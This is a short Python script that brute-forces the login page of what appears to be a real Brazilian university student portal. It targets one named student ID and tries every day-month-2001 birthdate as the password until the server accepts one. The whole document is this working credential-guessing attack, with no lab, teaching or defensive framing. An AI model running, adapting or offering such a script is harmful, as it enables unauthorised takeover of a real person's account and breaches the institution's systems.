import requests

url = "https://aluno.iesb.br/aluno/auth"

headers = {
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Thunder Client (https://www.thunderclient.com)",
    "Content-Type": "application/x-www-form-urlencoded"
}

achou = False
for i in range(1, 32):

	if achou:
		break

	for j in range(1, 13):

		password = ''

		if i < 10:
			password = f'{password}0{i}'
		else:
			password = f'{password}{i}'
		
		if j < 10:
			password = f'{password}0{j}'
		else:
			password = f'{password}{j}'

		password = f'{password}2001'

		payload = {
			"username": "2012130067",
			"password": password
		}

		print(password)

		response = requests.post(url, data=payload, headers=headers)
		if response.status_code == 200:
			print('\n\n\n achou:')
			print(password)
			achou = True
			break
	

